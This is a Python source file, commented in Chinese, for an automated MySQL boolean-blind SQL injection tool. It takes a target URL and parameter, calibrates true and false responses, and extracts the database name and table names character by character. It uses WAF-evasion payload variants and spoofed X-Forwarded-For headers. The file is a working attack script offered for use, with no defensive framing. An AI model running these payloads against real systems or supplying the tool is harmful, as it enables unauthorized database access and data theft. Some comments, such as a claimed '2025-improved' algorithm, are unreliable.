import requests
import random
import time
from difflib import SequenceMatcher


class MySQLBooleanBlindExploiter:
    def __init__(self, target_url, vulnerable_param):
        """
        参数:
            target_url (str): 目标URL（需包含协议头）
            vulnerable_param (str): 存在注入的参数名
        """
        self.target_url = target_url.rstrip('/')
        self.vulnerable_param = vulnerable_param
        self.session = requests.Session()
        self._setup_headers()
        self.true_markers = []  # 动态存储真实条件特征
        self.false_markers = []  # 动态存储假条件特征
        self.request_delay = 0.5  # 合规请求间隔(秒)

    def _setup_headers(self):
        """配置反WAF请求头"""
        self.session.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'X-Forwarded-For': f'18.{random.randint(1, 255)}.{random.randint(1, 255)}.1',
            'Accept-Language': 'en-US;q=0.8,zh-CN;q=0.6',
            'Cache-Control': 'no-transform'
        }

    def _calculate_similarity(self, resp1, resp2):
        """多维度响应相似度计算"""
        # 文本相似度（基于2025年改进的Ratcliff-Obershelp算法）
        text_sim = SequenceMatcher(None, resp1.text, resp2.text).ratio()

        # 结构相似度（标签/属性分布）
        struct_score = 0
        if hasattr(resp1, 'html') and hasattr(resp2, 'html'):
            struct_score = self._compare_dom_structure(resp1.html, resp2.html)

        return (text_sim * 0.6) + (struct_score * 0.4)

    def _send_request(self, payload):
        """发送请求并自动延时（合规速率控制）"""
        time.sleep(self.request_delay)
        try:
            return self.session.get(
                self.target_url,
                params={self.vulnerable_param: payload},
                timeout=10,
                allow_redirects=False
            )
        except Exception as e:
            print(f"[-] 请求失败: {str(e)[:50]}...")
            return None

    def calibrate_conditions(self):
        """校准真假条件基准（关键步骤）"""
        print("[*] 开始系统校准...")

        test_cases = [
            ("true_1", "1=1", True),
            ("true_2", "'a'='a'", True),
            ("false_1", "1=2", False),
            ("false_2", "'a'='b'", False),
            ("null_check", "NULL IS NULL", True)
        ]

        for name, condition, expected in test_cases:
            payload = f"1' AND {condition}-- "
            resp = self._send_request(payload)
            if resp:
                if expected:
                    self.true_markers.append(resp)
                else:
                    self.false_markers.append(resp)

        if len(self.true_markers) < 2 or len(self.false_markers) < 2:
            raise Exception("校准失败：无法建立有效基准")

        print("[+] 系统校准完成")

    def _check_condition(self, payload):
        """智能条件判断（核心算法）"""
        test_resp = self._send_request(payload)
        if not test_resp:
            return False

            # 计算与真实条件的平均相似度
        true_score = sum(self._calculate_similarity(test_resp, x)
                         for x in self.true_markers) / len(self.true_markers)

        # 计算与假条件的平均相似度
        false_score = sum(self._calculate_similarity(test_resp, x)
                          for x in self.false_markers) / len(self.false_markers)

        return true_score > false_score

    def _binary_search_char(self, query):
        """增强版二分法爆破（支持常见字符优先检测）"""
        common_chars = 'etaoinshrdluETAOINSHRDLU0123456789_@$'  # 2025年频率优化
        result = ""

        for i in range(1, 256):  # 最大支持255字符长度
            # 优先检测高频字符
            for char in common_chars:
                payload = self._generate_payload(
                    f"SUBSTRING(({query}),{i},1)='{char}'"
                )
                if self._check_condition(payload):
                    result += char
                    print(f"[+] 当前结果: {result}")
                    break
            else:  # 未命中常见字符时启用二分法
                low, high = 32, 126
                while low <= high:
                    mid = (low + high) // 2
                    payload = self._generate_payload(
                        f"ASCII(SUBSTRING(({query}),{i},1))>{mid}"
                    )
                    if self._check_condition(payload):
                        low = mid + 1
                    else:
                        high = mid - 1
                if low > 32:
                    result += chr(low)

        return result

    def _generate_payload(self, condition):
        variants = [
            f"1' AND {condition}-- ",
            f"1'/*!11440AND*/{condition}--+",
            f"1'%0bAND%0b{condition}%23",
            f"1'||({condition})#"
        ]
        return random.choice(variants)

    def exploit(self):
        """主爆破流程"""
        try:
            self.calibrate_conditions()

            # 爆破当前数据库
            print("\n[阶段1] 爆破数据库名")
            db_name = self._binary_search_char("database()")
            print(f"[+] 数据库名: {db_name}")

            # 爆破表名（示例爆破前3个表）
            print("\n[阶段2] 爆破表名")
            for i in range(3):
                table = self._binary_search_char(
                    f"(SELECT table_name FROM information_schema.tables  "
                    f"WHERE table_schema='{db_name}' LIMIT {i},1)"
                )
                if table:
                    print(f"[+] 发现表: {table}")

            # 更多爆破阶段可根据需要扩展...

        except Exception as e:
            print(f"[!] 爆破中断: {str(e)}")


if __name__ == "__main__":
    print("""
    MySQL布尔盲注自动化工具
    """)

    target = input("目标URL (e.g. http://example.com/page.php):  ").strip()
    param = input("漏洞参数名 (e.g. id): ").strip()

    exploiter = MySQLBooleanBlindExploiter(target, param)
    exploiter.exploit()
